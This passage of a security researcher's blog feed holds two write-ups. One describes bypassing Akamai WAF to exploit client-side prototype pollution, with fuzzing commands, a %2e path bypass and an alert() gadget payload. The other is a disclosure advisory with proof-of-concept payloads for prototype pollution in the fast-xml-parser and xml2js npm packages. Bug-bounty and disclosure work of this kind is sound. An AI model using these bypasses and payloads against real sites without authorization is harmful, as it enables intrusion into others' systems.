<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/02eb4516-ef05-41ea-b9fc-2e36755ddd85" alt="image" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[Web Desynth Recruit]]></summary></entry><entry><title type="html">Bypassing Akamai Waf To Exploit Prototype Pollution</title><link href="http://localhost:4000/2023/06/03/Bypassing-Akamai-WAF-To-Exploit-Prototype-Pollution.html" rel="alternate" type="text/html" title="Bypassing Akamai Waf To Exploit Prototype Pollution" /><published>2023-06-03T00:00:00+00:00</published><updated>2023-06-03T00:00:00+00:00</updated><id>http://localhost:4000/2023/06/03/Bypassing-Akamai-WAF-To-Exploit-Prototype-Pollution</id><content type="html" xml:base="http://localhost:4000/2023/06/03/Bypassing-Akamai-WAF-To-Exploit-Prototype-Pollution.html"><![CDATA[<p>A couple of weeks back Max posted a tweet regarding prototype pollution (pp) where he had trouble with Akamai WAF and couldn’t exploit pp coz of the waf.
He was happy to collaborate , split the bounty so I spent much time in bypassing this and at first it looked almost impossible I somehow managed to bypass it in the end.</p>

<p>As nothing of this worked I was curios myself what was the issue and I haven’t found any prototype pollution bugs in real websites so it would be fun I thought.</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/d56d44cc-46b4-40e6-b930-a75efae2c2e2" alt="chrome_F3WCZkQHV9" /></p>

<p>Max shared the site so I first started with checking which vulnerable library was responsible for this in order to identify the sink</p>

<p>Soon enough identified the sink:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">e</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">jQuery</span><span class="p">.</span><span class="nf">isEmptyObject</span><span class="p">(</span><span class="nx">e</span><span class="p">))</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nf">getJsonFromUrl</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">getJsonFromUrl</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="p">{};</span>
    <span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">&amp;</span><span class="dl">"</span><span class="p">).</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">t</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">+</span><span class="dl">"</span><span class="p">).</span><span class="nf">join</span><span class="p">(</span><span class="dl">"</span><span class="s2"> </span><span class="dl">"</span><span class="p">)).</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">=</span><span class="dl">"</span><span class="p">)</span>
              <span class="p">,</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="p">?</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="nx">e</span>
              <span class="p">,</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">t</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span> <span class="p">?</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nf">substr</span><span class="p">(</span><span class="nx">t</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="p">:</span> <span class="dl">""</span>
              <span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">[</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">o</span><span class="p">)</span>
                <span class="nx">n</span><span class="p">[</span><span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">i</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">]</span><span class="dl">"</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span>
                  <span class="p">,</span> <span class="nx">r</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">o</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">s</span><span class="p">));</span>
                <span class="nx">a</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">o</span><span class="p">)),</span>
                <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">||</span> <span class="p">(</span><span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="p">[]),</span>
                <span class="nx">r</span> <span class="p">?</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">][</span><span class="nx">r</span><span class="p">]</span> <span class="o">=</span> <span class="nx">i</span> <span class="p">:</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">].</span><span class="nf">push</span><span class="p">(</span><span class="nx">i</span><span class="p">)</span> <span class="c1">// prototype pollution here [2]</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}),</span>
    <span class="nx">n</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The method name says it all <code class="language-plaintext highlighter-rouge">getJsonFromUrl</code> , it converts query parameters to a json object</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">/?sudi=shirley</span><span class="w"> </span><span class="err">will</span><span class="w"> </span><span class="err">be</span><span class="w"> </span><span class="err">converted</span><span class="w"> </span><span class="err">to</span><span class="w"> 

</span><span class="p">{</span><span class="nl">"sudi"</span><span class="p">:</span><span class="s2">"shirley"</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>As the above method doesn’t performs any check againsts the key before performing the operation on line [2], this code is vulnerable to prototype pollution.</p>

<p>From this snyk advisory: https://security.snyk.io/vuln/SNYK-JS-LITESPEEDJS-2359250 you can find more details</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PoC
add the following query string ?__proto__[polluted]=yes

open the browser developer console. The property polluted has value yes
</code></pre></div></div>

<p>But it wasn’t as simple as what was mentioned in the POC as Akamai WAF was doing a good job here.</p>

<hr />

<p>The source is <code class="language-plaintext highlighter-rouge">location.href</code> , on line [1] you can see that it calls <code class="language-plaintext highlighter-rouge">getSearchOrHashBased</code> method which extracts the query parameter from the url including hash fragment part.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">e</span> <span class="o">||</span> <span class="p">(</span><span class="nx">e</span> <span class="o">=</span> <span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">);</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">?</span><span class="dl">"</span><span class="p">)</span>
      <span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">n</span> <span class="p">?</span> <span class="p">{}</span> <span class="p">:</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">t</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">t</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">length</span><span class="p">),</span>
    <span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="nx">n</span> <span class="o">||</span> <span class="nx">t</span> <span class="o">==</span> <span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">?</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span> <span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nf">substring</span><span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">t</span><span class="p">))</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This method is used to extract params either from the search or hash parameters from a URL.If there is # in the url and no ? , the hash parameters will be passed on and search params will be ignored.</p>

<p>Bypassing Akamai looked very easy at first ,as seeing source if from fragment part which will not be sent to the server and hence the WAF wouldn’t trigger.</p>

<p>But just coz of one silly mistake it didn’t worked. Can you figure it out what might be the problem? Use your Sharingan and take a good look at the code again (just kiding :p)</p>

<p>The developer forgot to remove the <code class="language-plaintext highlighter-rouge">#</code> part from the parameters</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/?sudi=shirley</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">sudi=shirley</span><span class="dl">'</span>
<span class="o">&gt;</span><span class="nf">getSearchOrHashBased</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://example.com/#sudi=shirley</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">#sudi=shirley</span><span class="dl">'</span>
</code></pre></div></div>

<p>Just because of a silly  mistake , this was passed as a key instead of just the parameter name <code class="language-plaintext highlighter-rouge">#sudi</code>.So upon using <code class="language-plaintext highlighter-rouge">#__proto__[x]=x</code> wouldn’t worke as</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">#__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span> <span class="c1">// #__proto__ is undefined</span>

</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">n</span> <span class="o">=</span> <span class="p">{}</span>
<span class="p">{}</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">#__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span>
<span class="nx">VM54</span><span class="p">:</span><span class="mi">1</span> <span class="nx">Uncaught</span> <span class="nx">TypeError</span><span class="p">:</span> <span class="nx">Cannot</span> <span class="kd">set</span> <span class="nx">properties</span> <span class="k">of</span> <span class="nf">undefined </span><span class="p">(</span><span class="nx">setting</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">)</span>
    <span class="nx">at</span> <span class="o">&lt;</span><span class="nx">anonymous</span><span class="o">&gt;</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">22</span>
<span class="p">(</span><span class="nx">anonymous</span><span class="p">)</span> <span class="p">@</span> <span class="nx">VM54</span><span class="p">:</span><span class="mi">1</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span>
<span class="dl">'</span><span class="s1">x</span><span class="dl">'</span>

<span class="o">&gt;</span><span class="nx">n</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="p">{</span><span class="nl">x</span><span class="p">:</span> <span class="dl">'</span><span class="s1">x</span><span class="dl">'</span><span class="p">,</span> <span class="kd">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
</code></pre></div></div>

<p>As <code class="language-plaintext highlighter-rouge">#</code> part failed we need to rely on the query params itself.</p>

<p>We can try using <code class="language-plaintext highlighter-rouge">contructor.prototype</code> property instead of <code class="language-plaintext highlighter-rouge">__proto__</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">x</span> <span class="o">=</span> <span class="p">{}</span>
<span class="p">{}</span>
<span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="p">{</span><span class="nl">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__lookupGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
<span class="nx">x</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span>
<span class="p">{</span><span class="nl">constructor</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__defineSetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">hasOwnProperty</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span> <span class="nx">__lookupGetter__</span><span class="p">:</span> <span class="nx">ƒ</span><span class="p">,</span><span class="err"> …</span><span class="p">}</span>
<span class="nx">x</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span> <span class="o">===</span> <span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="kc">true</span>
</code></pre></div></div>

<p>But this is not useful in our case as the code doesn’t iterates over all the properties recursively and also Akamai blocks the constructor keyword when used inside of <code class="language-plaintext highlighter-rouge">[constructor]</code></p>

<p>The legend Gareth himself also pointed out some solutions so I tried them too:</p>

<p>https://twitter.com/garethheyes/status/1657837036030554115</p>

<ol>
  <li>constructor.prototype</li>
</ol>

<p>As the dot notation isn’t supported in our case I used this instead <code class="language-plaintext highlighter-rouge">constructor[prototype][polluted]</code>
But as already pointed out <code class="language-plaintext highlighter-rouge">[prototype]</code> was blocked by Akamai</p>

<ol>
  <li><em>Try url encoding square brackets or using the hash instead of the query string. Other than that you’d probably need to use the existing code to bypass the WAF</em></li>
</ol>

<p>Url encoded (double url encode also) square brackets were still blocked by Akamai</p>

<p>In addition I also tried url encoding <code class="language-plaintext highlighter-rouge">__proto__</code> and the property which is place inside square brackets as in the <code class="language-plaintext highlighter-rouge">getJsonFromUrl</code> method you can see <code class="language-plaintext highlighter-rouge">decodeURIComponent</code> is used.</p>

<p>And already mentioned hash instead of query string isn’t an option coz of a silly mistake from developer’s side.</p>

<ol>
  <li><em>Oh I forgot obvious stuff like whitespace between brackets etc. JS supports all sorts of whitespace</em></li>
</ol>

<p>To explain this here’s an example,  javaScript is a whitespace-insensitive programming language, which means that it largely ignores whitespace characters like spaces, tabs, and line breaks:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="mi">1337</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span><span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span> <span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
<span class="mi">1337</span>
<span class="nb">Object</span><span class="p">.</span>                   <span class="nx">__proto__</span> <span class="p">.</span> <span class="nx">x</span>
</code></pre></div></div>

<p>But still this was also blocked by Akamai</p>

<p>Some more solutions which I suggested myself: https://twitter.com/sudhanshur705/status/1657753816241147904</p>

<hr />

<p><strong>Analyzing the WAF</strong></p>

<p>https://www.target.com/?<strong>proto</strong>            -&gt; allowed
https://www.target.com/?<strong>proto</strong>[]=x        -&gt; allowed
https://www.target.com/?<strong>proto</strong>[x]=x       -&gt; blocked
https://www.target.com/?<strong>proto</strong>[1]=x       -&gt; blocked</p>

<p>I spent almost a whole day and it seemed impossible to bypass, as there are only very limited variations I could do in case prototype pollution. In case of xss you have a no of tags,etc to try but here the options are limited.</p>

<p>So I started fuzzing query params adding some url encoded stuff which might break the WAF</p>

<p>Jub0bs recently posted a writeuop about a beautiful chain of bugs
https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/</p>

<p>Where he was able to bypass Akamai, by removing the <code class="language-plaintext highlighter-rouge">?</code> from the url and using <code class="language-plaintext highlighter-rouge">&amp;</code> instead.</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/a34b0177-e763-4368-9b7c-85c3f6045959" alt="image" /></p>

<p>I tried the same thing but it didn’t worked, so I though there might be more similar ways to bypass Akamai waf. SO I fuzzed different portions of the url</p>

<p>Like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?__proto__[x]FUZZ=x
https://www.target.com/?__proto__[FUZZx]=x
https://www.target.com/?FUZZ__proto__[x]=x
https://www.target.com/FUZZ?__proto__[x]=x
</code></pre></div></div>

<p>I used this wordlist: https://gist.github.com/Sudistark/d3e5f9e5dcad77c7e6560cb4b5ad66c8 , which contaions a list of url encoded characters.</p>

<p>The results were suprising one of them actually worked and returned 200 ok. Can you guess which url it was from the above 5 ?</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> urlencoded.txt <span class="nt">-u</span> <span class="s2">"https://www.target.com/FUZZ?__proto__[x]=x"</span>


%2e                     <span class="o">[</span>Status: 200, Size: 26150, Words: 4216, Lines: 558, Duration: 2532ms]
</code></pre></div></div>

<p>Ahhh that’s <code class="language-plaintext highlighter-rouge">.</code></p>

<p>But when I tried opening this url in my chrome browser: https://www.target.com/%2e?<strong>proto</strong>[x]=x
The dot was automatically removed (consumed), which is normal behaviour I guess as browsers as you might have seen browsers normalizes ../ also.</p>

<p>Then I remebered that Firefox is the exception here as it doesn’t consumes the  url encoded <code class="language-plaintext highlighter-rouge">.</code> and it still stays there.
So I again opened the same url now in firefox and this time it worked and also bypassed Akamai WAF.I checked the console to confirm if prototype pollution is working or not</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nx">x</span> <span class="o">=</span> <span class="p">{}</span>
<span class="nb">Object</span> <span class="p">{</span>  <span class="p">}</span>

<span class="o">&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="nb">Object</span> <span class="p">{</span> <span class="nl">x</span><span class="p">:</span> <span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">,</span> <span class="err">…</span> <span class="p">}</span>

<span class="o">&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">x</span>
<span class="dl">"</span><span class="s2">x</span><span class="dl">"</span> 
</code></pre></div></div>

<p>And yeah here we finally managed to bypass Akamai :)</p>

<p>Now comes finding the prototype pollution gagdet part, DomInvader has an inbuilt gagdet scanner.As I already saw some 3rd prty libraries like Adobe Dynamic Tag Management were in use in that page. I just picked up the gadget from here: https://github.com/BlackFan/client-side-prototype-pollution</p>

<p>https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?__proto__[src]=data:,alert(1)//
</code></pre></div></div>

<p>Here’s the screenshot of the alert popup</p>

<p><img src="https://github.com/Sudistark/BB-Writeups/assets/31372554/9d1ff684-95ce-4017-897a-2a68576945e5" alt="firefox_cgm1PDt65D" /></p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[A couple of weeks back Max posted a tweet regarding prototype pollution (pp) where he had trouble with Akamai WAF and couldn’t exploit pp coz of the waf. He was happy to collaborate , split the bounty so I spent much time in bypassing this and at first it looked almost impossible I somehow managed to bypass it in the end.]]></summary></entry><entry><title type="html">Prototype Pollution In Xml Parsers Npm Packages Advisory</title><link href="http://localhost:4000/2023/04/13/Prototype-pollution-in-XML-Parsers-NPM-Packages-Advisory.html" rel="alternate" type="text/html" title="Prototype Pollution In Xml Parsers Npm Packages Advisory" /><published>2023-04-13T00:00:00+00:00</published><updated>2023-04-13T00:00:00+00:00</updated><id>http://localhost:4000/2023/04/13/Prototype-pollution-in-XML-Parsers-NPM-Packages-Advisory</id><content type="html" xml:base="http://localhost:4000/2023/04/13/Prototype-pollution-in-XML-Parsers-NPM-Packages-Advisory.html"><![CDATA[<h1 id="fast-xml-parser">fast-xml-parser</h1>

<p>I was auditing another application and found that they were using 
<code class="language-plaintext highlighter-rouge">fast-xml-parser</code> parse uploaded xml files.</p>

<p>The package description says <em>Validate XML, Parse XML to JS Object, or Build XML from JS Object without C/C++ based libraries and no callback.</em></p>

<p><em>Parse XML to JS Object</em> - this sounded very interesting and I knew I should test for prototype pollution as many other packages which <em>convert json to js objects</em> were found to be vulnerable in the past and it turned out yeah this package was vulnerable to it.</p>

<p>https://www.npmjs.com/package/fast-xml-parser</p>

<p><img src="https://user-images.githubusercontent.com/31372554/232062163-c4a4494c-429e-416b-ab41-3e3bc38aef6a.png" alt="image" /></p>

<p>https://github.com/NaturalIntelligence/fast-xml-parser</p>

<p>Taking an example code from the github repo to demonstrate the bug:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="p">{</span> <span class="nx">XMLParser</span><span class="p">,</span> <span class="nx">XMLBuilder</span><span class="p">,</span> <span class="nx">XMLValidator</span><span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">fast-xml-parser</span><span class="dl">"</span><span class="p">);</span>


<span class="kd">let</span> <span class="nx">XMLdata</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;__proto__&gt;&lt;polluted&gt;hacked&lt;/polluted&gt;&lt;/__proto__&gt;</span><span class="dl">"</span>

<span class="kd">const</span> <span class="nx">parser</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLParser</span><span class="p">();</span>
<span class="kd">let</span> <span class="nx">jObj</span> <span class="o">=</span> <span class="nx">parser</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="nx">XMLdata</span><span class="p">);</span>


<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">jObj</span><span class="p">.</span><span class="nx">polluted</span><span class="p">)</span> <span class="c1">// should return hacked</span>
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/31372554/218308540-86792929-3631-4580-8373-4651487418b5.png" alt="Code_G3UvvJcSv5" /></p>

<p>In the above screenshot you can see the <code class="language-plaintext highlighter-rouge">jObj</code> was polluted with a new property.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jObj</span>
<span class="o">&gt;</span><span class="p">{}</span>
<span class="nx">jObj</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="o">&gt;</span><span class="p">{</span><span class="na">polluted</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hacked</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">jObj</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">polluted</span>
<span class="o">&gt;</span><span class="dl">'</span><span class="s1">hacked</span><span class="dl">'</span>
</code></pre></div></div>

<p>More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/</p>

<p>As it is common for developers to pass user controllable input to <code class="language-plaintext highlighter-rouge">XMLParser</code> , this can to do unexpected results. By chaining it with some prototype pollution gadget it might even can lead to RCE in some cases https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</p>

<p>Fix commit: https://github.com/NaturalIntelligence/fast-xml-parser/commit/2b032a4f799c63d83991e4f992f1c68e4dd05804</p>

<p>They are now validating, if the key contains <code class="language-plaintext highlighter-rouge">__proto__</code> and replaces it with <code class="language-plaintext highlighter-rouge">#__proto__</code></p>

<p>CVE is still pending</p>

<p>The package maintainer @amitguptagwl was very swift in replies and addressing the reported issue :)</p>

<p>SNYK Advisory: https://security.snyk.io/vuln/SNYK-JS-FASTXMLPARSER-3325616</p>

<hr />

<h1 id="xml2js">xml2js</h1>

<p>This package was also found to be vulnerable to the exact same vuln prototype pollution  (fast-xml-parser).
This one offers the same features like we have in fast-xml-parser, converting xml to js object.</p>

<p>https://www.npmjs.com/package/xml2js</p>

<p><img src="https://user-images.githubusercontent.com/31372554/232061839-ea220cb5-8ba8-4fbc-89ea-6f97c7267437.png" alt="image" /></p>

<p>Here are the details, the vulnerability is prototype pollution.</p>

<p>Taking an example code from the github repo to demonstrate the bug:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">parseString</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">xml2js</span><span class="dl">'</span><span class="p">).</span><span class="nx">parseString</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">xml</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&lt;__proto__&gt;&lt;polluted&gt;hacked&lt;/polluted&gt;&lt;/__proto__&gt;</span><span class="dl">"</span>
<span class="nf">parseString</span><span class="p">(</span><span class="nx">xml</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">result</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">dir</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>In the attached screenshot you can see the <code class="language-plaintext highlighter-rouge">result</code> object was polluted with a new property.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">result</span>
<span class="o">&gt;</span><span class="p">{}</span>
<span class="nx">result</span><span class="p">.</span><span class="nx">__proto__</span>
<span class="o">&gt;</span><span class="p">{</span><span class="na">polluted</span><span class="p">:</span> <span class="dl">'</span><span class="s1">hacked</span><span class="dl">'</span><span class="p">}</span>
<span class="nx">result</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">.</span><span class="nx">polluted</span>
<span class="o">&gt;</span><span class="dl">'</span><span class="s1">hacked</span><span class="dl">'</span>
</code></pre></div></div>

<p>More information on prototype pollution can be found here: https://learn.snyk.io/lessons/prototype-pollution/javascript/</p>

<p>It was really hard to get in contact with the maintainer,so I took help of Snyk Vulnerability Disclosure (https://snyk.io/vulnerability-disclosure/). I forwarded them the details in the end of Feb 2023 and recived more information on 10 Apr</p>

<p><img src="https://user-images.githubusercontent.com/31372554/232063590-87222517-f0ce-4864-af0e-b91baf9044ee.png" alt="image" /></p>

<p>So it seems this was already reported by some other researcher way back in 2020 : https://security.snyk.io/vuln/SNYK-JS-XML2JS-5414874</p>

<p>https://github.com/Leonidas-from-XIV/node-xml2js/issues/593</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><summary type="html"><![CDATA[fast-xml-parser]]></summary></entry></feed>